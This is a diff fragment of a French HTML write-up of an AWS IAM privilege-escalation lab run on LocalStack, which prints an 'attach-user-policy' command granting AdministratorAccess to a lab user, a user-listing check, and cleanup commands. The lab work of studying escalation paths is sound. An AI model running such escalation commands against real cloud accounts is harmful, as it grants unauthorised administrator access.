-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>attach-user-policy<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/AdministratorAccess
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>attach-user-policy<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/AdministratorAccess
 </code></pre></div>
 <h3 id="34-verification-dimpact">3.4 Vérification d'impact<a class="headerlink" href="#34-verification-dimpact" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;Users[].UserName&quot;</span><span class="w"> </span>--output<span class="w"> </span>table
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;Users[].UserName&quot;</span><span class="w"> </span>--output<span class="w"> </span>table
 </code></pre></div>
 <hr />
 <h2 id="4-synthese">4. Synthèse<a class="headerlink" href="#4-synthese" title="Permanent link">&para;</a></h2>
@@ -1791,9 +1832,9 @@
 <p><strong>Point méthodologique commun :</strong> dans les deux cas, une permission IAM unique et en apparence anodine (portée <code>Resource: "*"</code>) suffit à obtenir un accès administrateur complet, sans jamais toucher directement à des permissions "sensibles" explicites (type <code>iam:*</code> ou <code>Administrator*</code>). Ceci illustre l'importance de l'analyse des chemins de privesc IAM au-delà de la simple lecture des noms de policies attachées.</p>
 <p><strong>Environnement technique :</strong> LocalStack (édition avec compte gratuit + <code>LOCALSTACK_AUTH_TOKEN</code>, <code>ENFORCE_IAM=1</code>) s'est révélé être une alternative fiable et sans risque de quota/coût aux comptes cloud réels (AWS/Azure Free Trial), pour ce type d'exercice IAM. 29 chemins de privesc restants dans le playground IAM Vulnerable pour approfondissement ultérieur.</p>
 <p><strong>Nettoyage à prévoir en fin d'exercice complet :</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>tflocal<span class="w"> </span>destroy<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
-<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>docker<span class="w"> </span>stop<span class="w"> </span>localstack
-<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>docker<span class="w"> </span>rm<span class="w"> </span>localstack
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>tflocal<span class="w"> </span>destroy<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>docker<span class="w"> </span>stop<span class="w"> </span>localstack
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>docker<span class="w"> </span>rm<span class="w"> </span>localstack
 </code></pre></div></p>
 
 
